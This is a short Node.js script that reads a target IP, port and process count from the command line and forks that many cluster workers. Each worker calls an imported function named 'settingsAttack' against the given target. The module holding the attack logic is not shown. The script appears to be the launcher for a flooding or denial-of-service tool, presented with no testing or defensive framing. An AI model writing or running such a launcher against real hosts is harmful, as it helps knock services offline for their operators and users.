 settingsAttack = require('./function.js');

 const cluster = require('cluster');


function main(){
  try{
  const args = process.argv.slice(2);
  if(args.length!=3){
    console.log(args)
    console.log("Insert ip - port  - number of processes");
    process.exit(1);
  }
  const [ip, port, numberOfProcess] =args;
console.log(ip,port, numberOfProcess);
settingsAttack(ip,port);

    if (cluster.isMaster) {
        // Fork workers.
        for (let i = 0; i < numberOfProcess; i++) {
          cluster.fork();
        }
      
        cluster.on('exit', (worker, code, signal) => {
          console.log(`worker ${worker.process.pid} died`);
        });
      } else {
   
        settingsAttack(ip,port);
        console.log(`Worker ${process.pid} started`);

      }
        }catch(error){
          console.error(error.message);

        }
      

}
main();